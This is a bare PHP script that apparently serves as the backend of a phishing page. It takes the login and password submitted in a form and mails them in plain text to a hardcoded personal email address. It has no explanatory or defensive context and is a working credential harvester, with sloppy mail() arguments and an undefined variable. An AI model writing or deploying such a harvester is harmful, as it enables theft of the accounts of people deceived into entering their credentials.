<?php

$yourEmail = "dima_lus@bk.ru";

$login = $_POST['login'];
$pas = $_POST['password'];
$message = "Login: $login \n\nPassword: $pas";


    $res = mail($yourEmail, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");

?>
